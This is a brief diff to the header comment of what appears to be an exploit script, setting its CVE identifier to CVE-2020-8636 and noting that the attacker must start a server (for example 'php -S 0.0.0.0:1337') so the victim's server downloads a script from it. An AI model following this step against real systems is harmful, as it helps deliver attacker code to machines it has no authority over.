@@ -1,5 +1,5 @@
 """
-ID_CVE
+CVE-2020-8636
 
 OBS: It's necessary to start your server which will make a script available for download on the victim's server
 ex: php -S 0.0.0.0:1337
